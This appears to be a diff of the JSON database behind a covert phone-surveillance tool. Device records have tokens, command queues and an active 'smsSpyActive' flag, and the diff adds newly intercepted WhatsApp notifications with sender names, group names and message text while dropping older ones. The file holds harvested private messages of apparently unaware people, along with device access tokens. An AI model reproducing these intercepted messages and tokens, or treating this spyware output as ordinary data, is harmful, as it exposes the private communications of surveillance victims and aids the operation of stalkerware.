@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781270771,
+    "lastSeen": 1776781273734,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2914 pesan dari 16 chat",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781275495
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (1016 pesan): ~ aksesoris",
+        "content": "Dong",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781275422
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2913 pesan dari 16 chat",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781274296
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (1015 pesan): ~ aksesoris",
+        "content": "Info bt an opm fong",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781274158
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10296,38 +10328,6 @@
         "time": "21/04 20:54",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779646913
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (128 pesan): ~ lenzz store jp/rb/stok",
-        "content": "📷 tes aja brp ni",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779646763
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ZUNZ PEKALONGAN (997 pesan): Menyebut semua",
-        "content": "~ zunz: @⁨semua⁩",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779646632
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (78 pesan): Givano",
-        "content": "info by one",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779646493
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB1 ALDY BANYUMAS JATENG (54 pesan): ~ FANZZ 𝐂𝐀𝐒𝐓𝐔𝐒||C9||ROR",
-        "content": "inpo nokos",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779646330
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781269400,
+    "lastSeen": 1776781275305,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781270009,
+    "lastSeen": 1776781272950,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "kimm ade' an",
+        "content": "🎥 Video (1.38)",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781272839
+      },
       {
         "appName": "WhatsApp",
         "sender": "kimm ade' an",
